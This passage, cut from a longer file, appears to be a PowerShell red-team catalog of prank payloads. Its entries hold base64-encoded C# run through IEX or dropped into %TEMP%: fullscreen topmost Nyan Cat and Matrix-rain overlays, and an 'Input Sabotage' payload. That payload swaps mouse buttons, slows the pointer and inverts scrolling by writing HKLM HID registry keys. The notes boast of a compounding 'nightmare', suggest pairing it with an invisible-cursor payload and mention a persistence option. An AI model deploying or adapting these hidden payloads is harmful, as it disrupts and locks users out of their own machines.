gdGhpcy5TaG93SW5UYXNrYmFyPWZhbHNlOwogICAgICAgICAgICB0aGlzLkRvdWJsZUJ1ZmZlcmVkPXRydWU7IHRoaXMuVG9wTW9zdD10cnVlOyB0aGlzLkJhY2tDb2xvcj1Db2xvci5Gcm9tQXJnYigwLDUxLDEwMik7CiAgICAgICAgICAgIFJlY3RhbmdsZSB0b3RhbD1SZWN0YW5nbGUuRW1wdHk7CiAgICAgICAgICAgIGZvcmVhY2goU2NyZWVuIHMgaW4gU2NyZWVuLkFsbFNjcmVlbnMpIHRvdGFsPVJlY3RhbmdsZS5Vbmlvbih0b3RhbCxzLkJvdW5kcyk7CiAgICAgICAgICAgIHRoaXMuQm91bmRzPXRvdGFsOwogICAgICAgICAgICBpbnQgZXhTdHlsZT1HZXRXaW5kb3dMb25nKHRoaXMuSGFuZGxlLEdXTF9FWFNUWUxFKTsKICAgICAgICAgICAgU2V0V2luZG93TG9uZyh0aGlzLkhhbmRsZSxHV0xfRVhTVFlMRSxleFN0eWxlfFdTX0VYX1RPT0xXSU5ET1cpOwogICAgICAgICAgICBTZXRXaW5kb3dQb3ModGhpcy5IYW5kbGUsSFdORF9UT1BNT1NULDAsMCwwLDAsMHgwMDAxfDB4MDAwMik7CiAgICAgICAgICAgIGNhdFg9dGhpcy5XaWR0aC8zZjsgY2F0WT10aGlzLkhlaWdodC8zZjsKICAgICAgICAgICAgYW5pbVRpbWVyPW5ldyBUaW1lcigpOyBhbmltVGltZXIuSW50ZXJ2YWw9MzM7CiAgICAgICAgICAgIGFuaW1UaW1lci5UaWNrKz0ocyxlKT0+e2ZyYW1lKys7Y2F0WCs9ZHg7Y2F0WSs9ZHk7CiAgICAgICAgICAgICAgICBmbG9hdCBzdz1jYXRXKnBpeGVsU2NhbGUsc2g9Y2F0SCpwaXhlbFNjYWxlOwogICAgICAgICAgICAgICAgaWYoY2F0WCtzdz50aGlzLldpZHRofHxjYXRYPDApZHg9LWR4O2lmKGNhdFkrc2g+dGhpcy5IZWlnaHR8fGNhdFk8MClkeT0tZHk7CiAgICAgICAgICAgICAgICB0cmFpbC5BZGQobmV3IFBvaW50RihjYXRYLGNhdFkrc2gvMmYpKTtpZih0cmFpbC5Db3VudD5tYXhUcmFpbCl0cmFpbC5SZW1vdmVBdCgwKTsKICAgICAgICAgICAgICAgIHRoaXMuSW52YWxpZGF0ZSgpO307CiAgICAgICAgICAgIGFuaW1UaW1lci5TdGFydCgpOwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9pZCBPblBhaW50KFBhaW50RXZlbnRBcmdzIGUpIHsKICAgICAgICAgICAgR3JhcGhpY3MgZz1lLkdyYXBoaWNzOyBnLkNsZWFyKENvbG9yLkZyb21BcmdiKDAsNTEsMTAyKSk7CiAgICAgICAgICAgIGcuU21vb3RoaW5nTW9kZT1TeXN0ZW0uRHJhd2luZy5EcmF3aW5nMkQuU21vb3RoaW5nTW9kZS5Ob25lOwogICAgICAgICAgICBmbG9hdCBwPXBpeGVsU2NhbGUsYm9iT2Zmc2V0PShmcmFtZSU2PDMpP3A6MDsKICAgICAgICAgICAgaWYodHJhaWwuQ291bnQ+MSl7ZmxvYXQgc3RyaXBlSD0oY2F0SCpwKS8ocmFpbmJvdy5MZW5ndGgqMik7CiAgICAgICAgICAgICAgICBmb3IoaW50IGk9MTtpPHRyYWlsLkNvdW50O2krKyl7ZmxvYXQgdHg9dHJhaWxbaV0uWCx0eT10cmFpbFtpXS5ZLHByZXZYPXRyYWlsW2ktMV0uWDsKICAgICAgICAgICAgICAgICAgICBmbG9hdCBzZWdXPU1hdGguQWJzKHR4LXByZXZYKStwKjIsZHJhd1g9TWF0aC5NaW4odHgscHJldlgpLHdhdmVPZmY9KChpJTQpPDIpP3A6MDsKICAgICAgICAgICAgICAgICAgICBmb3IoaW50IHM9MDtzPHJhaW5ib3cuTGVuZ3RoO3MrKyl1c2luZyhCcnVzaCBiPW5ldyBTb2xpZEJydXNoKENvbG9yLkZyb21BcmdiKDIwMCppL3RyYWlsLkNvdW50KzU1LHJhaW5ib3dbc10uUixyYWluYm93W3NdLkcscmFpbmJvd1tzXS5CKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIGcuRmlsbFJlY3RhbmdsZShiLGRyYXdYLHR5LShyYWluYm93Lkxlbmd0aC8yZi1zKSpzdHJpcGVIK3dhdmVPZmYsc2VnVyxzdHJpcGVIKzEpO319CiAgICAgICAgICAgIGZsb2F0IGN4PWNhdFgsY3k9Y2F0WStib2JPZmZzZXQ7CiAgICAgICAgICAgIHVzaW5nKEJydXNoIHRiPW5ldyBTb2xpZEJydXNoKHRhcnQpKXVzaW5nKEJydXNoIGViPW5ldyBTb2xpZEJydXNoKHRhcnRFZGdlKSl1c2luZyhCcnVzaCBwYj1uZXcgU29saWRCcnVzaChwaW5rKSl7CiAgICAgICAgICAgICAgICBnLkZpbGxSZWN0YW5nbGUoZWIsY3grOCpwLGN5KzQqcCw0MCpwLDMyKnApOyBnLkZpbGxSZWN0YW5nbGUodGIsY3grMTAqcCxjeSs2KnAsMzYqcCwyOCpwKTsgZy5GaWxsUmVjdGFuZ2xlKHBiLGN4KzEyKnAsY3krOCpwLDMyKnAsMjIqcCk7CiAgICAgICAgICAgICAgICBDb2xvcltdIHNwPXtDb2xvci5SZWQsQ29sb3IuWWVsbG93LENvbG9yLkN5YW4sQ29sb3IuTWFnZW50YX07CiAgICAgICAgICAgICAgICBpbnRbLF0gc3Bvcz17ezE2LDEyfSx7MjIsMTB9LHszMCwxNH0sezM2LDEwfSx7MjAsMTh9LHsyOCwyMH0sezM0LDE4fSx7MTgsMjR9LHsyNiwyNH0sezM4LDIyfX07CiAgICAgICAgICAgICAgICBmb3IoaW50IGk9MDtpPHNwb3MuR2V0TGVuZ3RoKDApO2krKyl1c2luZyhCcnVzaCBzYj1uZXcgU29saWRCcnVzaChzcFtpJXNwLkxlbmd0aF0pKWcuRmlsbFJlY3RhbmdsZShzYixjeCtzcG9zW2ksMF0qcCxjeStzcG9zW2ksMV0qcCwyKnAsMipwKTt9CiAgICAgICAgICAgIHVzaW5nKEJydXNoIGRhcms9bmV3IFNvbGlkQnJ1c2goZGFya0dyYXkpKXVzaW5nKEJydXNoIHdoaXRlPW5ldyBTb2xpZEJydXNoKENvbG9yLldoaXRlKSl1c2luZyhCcnVzaCBwYz1uZXcgU29saWRCcnVzaChDb2xvci5Gcm9tQXJnYigyNTUsMTAyLDE1MykpKXsKICAgICAgICAgICAgICAgIGcuRmlsbFJlY3RhbmdsZShkYXJrLGN4KzIqcCxjeSs4KnAsMTQqcCwyMCpwKTtnLkZpbGxSZWN0YW5nbGUobmV3IFNvbGlkQnJ1c2goQ29sb3IuRnJvbUFyZ2IoMTIwLDEyMCwxMjApKSxjeCs0KnAsY3krMTAqcCwxMCpwLDE2KnApOwogICAgICAgICAgICAgICAgZy5GaWxsUmVjdGFuZ2xlKGRhcmssY3grMipwLGN5KzQqcCw0KnAsNipwKTtnLkZpbGxSZWN0YW5nbGUoZGFyayxjeCsxMCpwLGN5KzQqcCw0KnAsNipwKTsKICAgICAgICAgICAgICAgIGcuRmlsbFJlY3RhbmdsZSh3aGl0ZSxjeCs1KnAsY3krMTYqcCwzKnAsMypwKTtnLkZpbGxSZWN0YW5nbGUoZGFyayxjeCs2KnAsY3krMTcqcCwyKnAsMipwKTsKICAgICAgICAgICAgICAgIGcuRmlsbFJlY3RhbmdsZSh3aGl0ZSxjeCsxMCpwLGN5KzE2KnAsMypwLDMqcCk7Zy5GaWxsUmVjdGFuZ2xlKGRhcmssY3grMTEqcCxjeSsxNypwLDIqcCwyKnApOwogICAgICAgICAgICAgICAgZy5GaWxsUmVjdGFuZ2xlKGRhcmssY3grNypwLGN5KzIyKnAsNCpwLHApOwogICAgICAgICAgICAgICAgZy5GaWxsUmVjdGFuZ2xlKHBjLGN4KzMqcCxjeSsyMCpwLDIqcCwyKnApO2cuRmlsbFJlY3RhbmdsZShwYyxjeCsxMipwLGN5KzIwKnAsMipwLDIqcCk7CiAgICAgICAgICAgICAgICBmbG9hdCBsbz0oZnJhbWUlNDwyKT8yKnA6MDsKICAgICAgICAgICAgICAgIGcuRmlsbFJlY3RhbmdsZShkYXJrLGN4KzE0KnAsY3krMzQqcCtsbyw0KnAsNipwKTtnLkZpbGxSZWN0YW5nbGUoZGFyayxjeCsyMipwLGN5KzM0KnArKDIqcC1sbyksNCpwLDYqcCk7CiAgICAgICAgICAgICAgICBnLkZpbGxSZWN0YW5nbGUoZGFyayxjeCszNCpwLGN5KzM0KnArbG8sNCpwLDYqcCk7Zy5GaWxsUmVjdGFuZ2xlKGRhcmssY3grNDIqcCxjeSszNCpwKygyKnAtbG8pLDQqcCw2KnApOwogICAgICAgICAgICAgICAgZmxvYXQgdG89KGZyYW1lJTY8Myk/MipwOjA7Zy5GaWxsUmVjdGFuZ2xlKGRhcmssY3grNDgqcCxjeSsxNipwK3RvLDQqcCwxMCpwKTt9CiAgICAgICAgICAgIHVzaW5nKEJydXNoIHNiPW5ldyBTb2xpZEJydXNoKENvbG9yLldoaXRlKSl7UmFuZG9tIHNyPW5ldyBSYW5kb20oNDIpOwogICAgICAgICAgICAgICAgZm9yKGludCBpPTA7aTwzMDtpKyspe2Zsb2F0IHN4PXNyLk5leHQoMCx0aGlzLldpZHRoKSxzeT1zci5OZXh0KDAsdGhpcy5IZWlnaHQpOwogICAgICAgICAgICAgICAgICAgIGludCBzZj0oZnJhbWUraSo3KSUxMjtmbG9hdCBzcz0oc2Y8NCk/Mjooc2Y8OCk/NDo2OwogICAgICAgICAgICAgICAgICAgIGcuRmlsbFJlY3RhbmdsZShzYixzeCxzeS1zcy8yLDIsc3MpO2cuRmlsbFJlY3RhbmdsZShzYixzeC1zcy8yLHN5LHNzLDIpO319CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSB2b2lkIE9uS2V5RG93bihLZXlFdmVudEFyZ3MgZSl7aWYoZS5Db250cm9sJiZlLlNoaWZ0JiZlLktleUNvZGU9PUtleXMuUSl7YW5pbVRpbWVyLlN0b3AoKTt0aGlzLkNsb3NlKCk7fWJhc2UuT25LZXlEb3duKGUpO30KICAgICAgICBwcm90ZWN0ZWQgb3ZlcnJpZGUgQ3JlYXRlUGFyYW1zIENyZWF0ZVBhcmFtc3tnZXR7Q3JlYXRlUGFyYW1zIGNwPWJhc2UuQ3JlYXRlUGFyYW1zO2NwLkV4U3R5bGV8PVdTX0VYX1RPT0xXSU5ET1c7cmV0dXJuIGNwO319CiAgICB9Cn0KIkAKQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRjb2RlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyBTeXN0ZW0uV2luZG93cy5Gb3JtcyxTeXN0ZW0uRHJhd2luZyAtRXJyb3JBY3Rpb24gU3RvcApbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpSdW4oKE5ldy1PYmplY3QgTnlhbkltcGFjdC5OeWFuRm9ybSkp')));Start-Process powershell "-NoP -NonI -File `"$_f`"" -WindowStyle Normal'
        Notes = 'Drawn entirely in GDI pixel art at pixelScale=4 (each "pixel" is 4x4 screen pixels). Rainbow trail uses alpha-weighted stripes with wave offset. Bob offset, leg animation, and tail wag all frame-synced. Deep blue (#003366) starfield background with 30 twinkling cross-shaped stars. INTERACTIVE SESSION ONLY — use -Persist registry. Kill switch: Ctrl+Shift+Q.'
    }

    'MEME-015' = @{
        Desc  = 'Input Sabotage — swaps left/right mouse buttons, drops mouse speed to 1/20 minimum, inverts touchpad and HID scroll direction (FlipFlopWheel), and enables 15-frame mouse trails. All via Win32 + registry — no window, no process. Restore() included.'
        Cmd   = '[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNvZGUgPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgTWljcm9zb2Z0LldpbjMyOwpuYW1lc3BhY2UgSW5wdXRTYWJvdGFnZSB7CiAgICBwdWJsaWMgY2xhc3MgQ2hhb3MgewogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIFN3YXBNb3VzZUJ1dHRvbihib29sIGZTd2FwKTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHN0YXRpYyBleHRlcm4gYm9vbCBTeXN0ZW1QYXJhbWV0ZXJzSW5mbyh1aW50IHVpQWN0aW9uLCB1aW50IHVpUGFyYW0sIEludFB0ciBwdlBhcmFtLCB1aW50IGZXaW5JbmkpOwogICAgICAgIGNvbnN0IHVpbnQgU1BJX1NFVE1PVVNFU1BFRUQgPSAweDAwNzE7IGNvbnN0IHVpbnQgU1BJRl9TRU5EQ0hBTkdFID0gMHgwMjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBEZXBsb3koKSB7CiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSAiIjsKICAgICAgICAgICAgdHJ5IHsgU3dhcE1vdXNlQnV0dG9uKHRydWUpOyByZXN1bHQgKz0gIkJ1dHRvbnMgc3dhcHBlZC5cbiI7IH0gY2F0Y2gge30KICAgICAgICAgICAgdHJ5IHsgU3lzdGVtUGFyYW1ldGVyc0luZm8oU1BJX1NFVE1PVVNFU1BFRUQsIDAsIChJbnRQdHIpMSwgU1BJRl9TRU5EQ0hBTkdFKTsgcmVzdWx0ICs9ICJTcGVlZD0xLzIwLlxuIjsgfSBjYXRjaCB7fQogICAgICAgICAgICB0cnkgeyB1c2luZyAoUmVnaXN0cnlLZXkgayA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQcmVjaXNpb25Ub3VjaFBhZCIsIHRydWUpKSB7IGlmIChrICE9IG51bGwpIHsgay5TZXRWYWx1ZSgiU2Nyb2xsRGlyZWN0aW9uIiwgMCwgUmVnaXN0cnlWYWx1ZUtpbmQuRFdvcmQpOyByZXN1bHQgKz0gIlRvdWNocGFkIGludmVydGVkLlxuIjsgfSB9IH0gY2F0Y2gge30KICAgICAgICAgICAgdHJ5IHsgdXNpbmcgKFJlZ2lzdHJ5S2V5IGhpZCA9IFJlZ2lzdHJ5LkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5KEAiU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XEVudW1cSElEIiwgZmFsc2UpKSB7IGlmIChoaWQgIT0gbnVsbCkgZm9yZWFjaCAoc3RyaW5nIGRldiBpbiBoaWQuR2V0U3ViS2V5TmFtZXMoKSkgdXNpbmcgKFJlZ2lzdHJ5S2V5IGQgPSBoaWQuT3BlblN1YktleShkZXYsIGZhbHNlKSkgeyBpZiAoZCA9PSBudWxsKSBjb250aW51ZTsgZm9yZWFjaCAoc3RyaW5nIGluc3QgaW4gZC5HZXRTdWJLZXlOYW1lcygpKSB0cnkgeyB1c2luZyAoUmVnaXN0cnlLZXkgZHAgPSBSZWdpc3RyeS5Mb2NhbE1hY2hpbmUuT3BlblN1YktleShAIlNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxFbnVtXEhJRFwiICsgZGV2ICsgQCJcIiArIGluc3QgKyBAIlxEZXZpY2UgUGFyYW1ldGVycyIsIHRydWUpKSB7IGlmIChkcCAhPSBudWxsKSBkcC5TZXRWYWx1ZSgiRmxpcEZsb3BXaGVlbCIsIDEsIFJlZ2lzdHJ5VmFsdWVLaW5kLkRXb3JkKTsgfSB9IGNhdGNoIHt9IH0gfSB9IGNhdGNoIHt9CiAgICAgICAgICAgIHRyeSB7IHVzaW5nIChSZWdpc3RyeUtleSBrID0gUmVnaXN0cnkuQ3VycmVudFVzZXIuT3BlblN1YktleShAIkNvbnRyb2wgUGFuZWxcTW91c2UiLCB0cnVlKSkgeyBpZiAoayAhPSBudWxsKSBrLlNldFZhbHVlKCJNb3VzZVRyYWlscyIsICIxNSIpOyB9IFN5c3RlbVBhcmFtZXRlcnNJbmZvKDB4MDA1RSwgMTUsIEludFB0ci5aZXJvLCBTUElGX1NFTkRDSEFOR0UpOyByZXN1bHQgKz0gIlRyYWlscz0xNS5cbiI7IH0gY2F0Y2gge30KICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICB9CiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUmVzdG9yZSgpIHsKICAgICAgICAgICAgdHJ5IHsgU3dhcE1vdXNlQnV0dG9uKGZhbHNlKTsgfSBjYXRjaCB7fQogICAgICAgICAgICB0cnkgeyBTeXN0ZW1QYXJhbWV0ZXJzSW5mbyhTUElfU0VUTU9VU0VTUEVFRCwgMCwgKEludFB0cikxMCwgU1BJRl9TRU5EQ0hBTkdFKTsgfSBjYXRjaCB7fQogICAgICAgICAgICB0cnkgeyB1c2luZyAoUmVnaXN0cnlLZXkgayA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJDb250cm9sIFBhbmVsXE1vdXNlIiwgdHJ1ZSkpIHsgaWYgKGsgIT0gbnVsbCkgay5TZXRWYWx1ZSgiTW91c2VUcmFpbHMiLCAiMCIpOyB9IFN5c3RlbVBhcmFtZXRlcnNJbmZvKDB4MDA1RSwgMCwgSW50UHRyLlplcm8sIFNQSUZfU0VORENIQU5HRSk7IH0gY2F0Y2gge30KICAgICAgICAgICAgcmV0dXJuICJSZXN0b3JlZC4iOwogICAgICAgIH0KICAgIH0KfQoiQApBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGNvZGUgLUVycm9yQWN0aW9uIFN0b3AKW0lucHV0U2Fib3RhZ2UuQ2hhb3NdOjpEZXBsb3koKQ=='))|IEX'
        Notes = 'Each change is individually identifiable; all four together create a compounding feedback nightmare. Pairs perfectly with MEME-013 (Invisible Cursor): fixing one problem leaves three others wrong, and you cannot see where you are clicking while doing it. Changes survive PS process exit and persist until logoff or explicit restore. Restore: [InputSabotage.Chaos]::Restore(). INTERACTIVE SESSION ONLY — use -Persist registry. VALIDATED by red team.'
    }

    'MEME-016' = @{
        Desc  = 'Matrix Rain GDI — fullscreen Katakana + alphanumeric digital rain with per-column speed/length variance, alpha-fade buffer, bright white leading char, green trail. All screens covered. Indefinite runtime. Ctrl+Shift+Q to kill.'
        Cmd   = '$_f="$env:TEMP\meme016_matrix.ps1";[IO.File]::WriteAllText($_f,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRjb2RlID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRHJhd2luZzsKdXNpbmcgU3lzdGVtLkRyYXdpbmcuVGV4dDsKdXNpbmcgU3lzdGVtLldpbmRvd3MuRm9ybXM7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKbmFtZXNwYWNlIE1hdHJpeFJhaW4gewogICAgcHVibGljIGNsYXNzIE1hdHJpeEZvcm0gOiBGb3JtIHsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHN0YXRpYyBleHRlcm4gaW50IFNldFdpbmRvd0xvbmcoSW50UHRyIGhXbmQsIGludCBuSW5kZXgsIGludCBkd05ld0xvbmcpOwogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93TG9uZyhJbnRQdHIgaFduZCwgaW50IG5JbmRleCk7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0V2luZG93UG9zKEludFB0ciBoV25kLCBJbnRQdHIgaFduZEluc2VydEFmdGVyLCBpbnQgWCwgaW50IFksIGludCBjeCwgaW50IGN5LCB1aW50IHVGbGFncyk7CiAgICAgICAgc3RhdGljIHJlYWRvbmx5IEludFB0ciBIV05EX1RPUE1PU1QgPSBuZXcgSW50UHRyKC0xKTsKICAgICAgICBjb25zdCBpbnQgR1dMX0VYU1RZTEUgPSAtMjA7IGNvbnN0IGludCBXU19FWF9UT09MV0lORE9XID0gMHgwMDAwMDA4MDsKICAgICAgICBwcml2YXRlIFRpbWVyIHJhaW5UaW1lcjsgcHJpdmF0ZSBSYW5kb20gcm5nID0gbmV3IFJhbmRvbSgpOwogICAgICAgIHByaXZhdGUgaW50IGZvbnRTaXplID0gMTQ7IHByaXZhdGUgaW50IGNvbHVtbnM7CiAgICAgICAgcHJpdmF0ZSBmbG9hdFtdIGRyb3BzOyBwcml2YXRlIGZsb2F0W10gc3BlZWRzOyBwcml2YXRlIGludFtdIGxlbmd0aHM7CiAgICAgICAgcHJpdmF0ZSBCaXRtYXAgYnVmZmVyOyBwcml2YXRlIEdyYXBoaWNzIGJ1ZmZlckc7CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgcmVhZG9ubHkgc3RyaW5nIGNoYXJzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OUAjJCUmKis9LX48Pnt9W118IiArCiAgICAgICAgICAgICJcdTMwQTJcdTMwQTRcdTMwQTZcdTMwQThcdTMwQUFcdTMwQUJcdTMwQURcdTMwQUZcdTMwQjFcdTMwQjNcdTMwQjVcdTMwQjdcdTMwQjlcdTMwQkJcdTMwQkQiICsKICAgICAgICAgICAgIlx1MzBCRlx1MzBDMVx1MzBDNFx1MzBDNlx1MzBDOFx1MzBDQVx1MzBDQlx1MzBDQ1x1MzBDRFx1MzBDRVx1MzBDRlx1MzBEMlx1MzBENVx1MzBEOFx1MzBEQiIgKwogICAgICAgICAgICAiXHUzMERFXHUzMERGXHUzMEUwXHUzMEUxXHUzMEUyXHUzMEU0XHUzMEU2XHUzMEU4XHUzMEU5XHUzMEVBXHUzMEVCXHUzMEVDXHUzMEVEXHUzMEVGXHUzMEYyXHUzMEYzIjsKICAgICAgICBwdWJsaWMgTWF0cml4Rm9ybSgpIHsKICAgICAgICAgICAgdGhpcy5Gb3JtQm9yZGVyU3R5bGU9Rm9ybUJvcmRlclN0eWxlLk5vbmU7IHRoaXMuU2hvd0luVGFza2Jhcj1mYWxzZTsKICAgICAgICAgICAgdGhpcy5Eb3VibGVCdWZmZXJlZD10cnVlOyB0aGlzLlRvcE1vc3Q9dHJ1ZTsgdGhpcy5CYWNrQ29sb3I9Q29sb3IuQmxhY2s7CiAgICAgICAgICAgIFJlY3RhbmdsZSB0b3RhbD1SZWN0YW5nbGUuRW1wdHk7CiAgICAgICAgICAgIGZvcmVhY2goU2NyZWVuIHMgaW4gU2NyZWVuLkFsbFNjcmVlbnMpIHRvdGFsPVJlY3RhbmdsZS5Vbmlvbih0b3RhbCxzLkJvdW5kcyk7CiAgICAgICAgICAgIHRoaXMuQm91bmRzPXRvdGFsOwogICAgICAgICAgICBpbnQgZXhTdHlsZT1HZXRXaW5kb3dMb25nKHRoaXMuSGFuZGxlLEdXTF9FWFNUWUxFKTsKICAgICAgICAgICAgU2V0V2luZG93TG9uZyh0aGlzLkhhbmRsZSxHV0xfRVhTVFlMRSxleFN0eWxlfFdTX0VYX1RPT0xXSU5ET1cpOwogICAgICAgICAgICBTZXRXaW5kb3dQb3ModGhpcy5IYW5kbGUsSFdORF9UT1BNT1NULDAsMCwwLDAsMHgwMDAxfDB4MDAwMik7CiAgICAgICAgICAgIGNvbHVtbnM9dGhpcy5XaWR0aC9mb250U2l6ZTsgZHJvcHM9bmV3IGZsb2F0W2NvbHVtbnNdOyBzcGVlZHM9bmV3IGZsb2F0W2NvbHVtbnNdOyBsZW5ndGhzPW5ldyBpbnRbY29sdW1uc107CiAgICAgICAgICAgIGZvcihpbnQgaT0wO2k8Y29sdW1ucztpKyspe2Ryb3BzW2ldPXJuZy5OZXh0KC00MCwwKTtzcGVlZHNbaV09MC4zZisoZmxvYXQpKHJuZy5OZXh0RG91YmxlKCkqMS4yKTtsZW5ndGhzW2ldPTgrcm5nLk5leHQoMjApO30KICAgICAgICAgICAgYnVmZmVyPW5ldyBCaXRtYXAodGhpcy5XaWR0aCx0aGlzLkhlaWdodCk7IGJ1ZmZlckc9R3JhcGhpY3MuRnJvbUltYWdlKGJ1ZmZlcik7IGJ1ZmZlckcuQ2xlYXIoQ29sb3IuQmxhY2spOwogICAgICAgICAgICByYWluVGltZXI9bmV3IFRpbWVyKCk7IHJhaW5UaW1lci5JbnRlcnZhbD0zMzsgcmFpblRpbWVyLlRpY2srPU9uVGljazsgcmFpblRpbWVyLlN0YXJ0KCk7CiAgICAgICAgfQogICAgICAgIHByaXZhdGUgdm9pZCBPblRpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsKICAgICAgICAgICAgdXNpbmcoQnJ1c2ggZmI9bmV3IFNvbGlkQnJ1c2goQ29sb3IuRnJvbUFyZ2IoMjUsMCwwLDApKSkgYnVmZmVyRy5GaWxsUmVjdGFuZ2xlKGZiLDAsMCxidWZmZXIuV2lkdGgsYnVmZmVyLkhlaWdodCk7CiAgICAgICAgICAgIEZvbnQgZm9udD1uZXcgRm9udCgiQ29uc29sYXMiLGZvbnRTaXplLEZvbnRTdHlsZS5Cb2xkKTsKICAgICAgICAgICAgZm9yKGludCBpPTA7aTxjb2x1bW5zO2krKyl7aW50IHg9aSpmb250U2l6ZSx5PShpbnQpKGRyb3BzW2ldKmZvbnRTaXplKTsKICAgICAgICAgICAgICAgIGlmKHk+PTAmJnk8dGhpcy5IZWlnaHQpe2NoYXIgYz1jaGFyc1tybmcuTmV4dChjaGFycy5MZW5ndGgpXTsKICAgICAgICAgICAgICAgICAgICB1c2luZyhCcnVzaCBoYj1uZXcgU29saWRCcnVzaChDb2xvci5Gcm9tQXJnYigyNTUsMjIwLDI1NSwyMjApKSkgYnVmZmVyRy5EcmF3U3RyaW5nKGMuVG9TdHJpbmcoKSxmb250LGhiLHgseSk7CiAgICAgICAgICAgICAgICAgICAgaWYoeS1mb250U2l6ZT49MCl7Y2hhciBjMj1jaGFyc1tybmcuTmV4dChjaGFycy5MZW5ndGgpXTsKICAgICAgICAgICAgICAgICAgICAgICAgdXNpbmcoQnJ1c2ggZ2I9bmV3IFNvbGlkQnJ1c2goQ29sb3IuRnJvbUFyZ2IoMjU1LDAsMjU1LDY1KSkpIGJ1ZmZlckcuRHJhd1N0cmluZyhjMi5Ub1N0cmluZygpLGZvbnQsZ2IseCx5LWZvbnRTaXplKTt9fQogICAgICAgICAgICAgICAgZHJvcHNbaV0rPXNwZWVkc1tpXTsKICAgICAgICAgICAgICAgIGlmKGRyb3BzW2ldKmZvbnRTaXplPnRoaXMuSGVpZ2h0K2xlbmd0aHNbaV0qZm9udFNpemUpe2Ryb3BzW2ldPXJuZy5OZXh0KC0yMCwtMSk7c3BlZWRzW2ldPTAuM2YrKGZsb2F0KShybmcuTmV4dERvdWJsZSgpKjEuMik7bGVuZ3Roc1tpXT04K3JuZy5OZXh0KDIwKTt9fQogICAgICAgICAgICBmb250LkRpc3Bvc2UoKTsgdGhpcy5JbnZhbGlkYXRlKCk7CiAgICAgICAgfQogICAgICAgIHByb3RlY3RlZCBvdmVycmlkZSB2b2lkIE9uUGFpbnQoUGFpbnRFdmVudEFyZ3MgZSl7ZS5HcmFwaGljcy5EcmF3SW1hZ2VVbnNjYWxlZChidWZmZXIsMCwwKTt9CiAgICAgICAgcHJvdGVjdGVkIG92ZXJyaWRlIHZvaWQgT25LZXlEb3duKEtleUV2ZW50QXJncyBlKXtpZihlLkNvbnRyb2wmJmUuU2hpZnQmJmUuS2V5Q29kZT09S2V5cy5RKXtyYWluVGltZXIuU3RvcCgpO2J1ZmZlckcuRGlzcG9zZSgpO2J1ZmZlci5EaXNwb3NlKCk7dGhpcy5DbG9zZSgpO31iYXNlLk9uS2V5RG93bihlKTt9CiAgICAgICAgcHJvdGVjdGVkIG92ZXJyaWRlIHZvaWQgT25Gb3JtQ2xvc2VkKEZvcm1DbG9zZWRFdmVudEFyZ3MgZSl7dHJ5e2J1ZmZlckcuRGlzcG9zZSgpO31jYXRjaHt9dHJ5e2J1ZmZlci5EaXNwb3NlKCk7fWNhdGNoe31iYXNlLk9uRm9ybUNsb3NlZChlKTt9CiAgICAgICAgcHJvdGVjdGVkIG92ZXJyaWRlIENyZWF0ZVBhcmFtcyBDcmVhdGVQYXJhbXN7Z2V0e0NyZWF0ZVBhcmFtcyBjcD1iYXNlLkNyZWF0ZVBhcmFtcztjcC5FeFN0eWxlfD1XU19FWF9UT09MV0lORE9XO3JldHVybiBjcDt9fQogICAgfQp9CiJACkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkY29kZSAtUmVmZXJlbmNlZEFzc2VtYmxpZXMgU3lzdGVtLldpbmRvd3MuRm9ybXMsU3lzdGVtLkRyYXdpbmcgLUVycm9yQWN0aW9uIFN0b3AKW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkFwcGxpY2F0aW9uXTo6UnVuKChOZXctT2JqZWN0IE1hdHJpeFJhaW4uTWF0cml4Rm9ybSkp')));Start-Process powershell "-NoP -NonI -File `"$_f`"" -WindowStyle Normal'
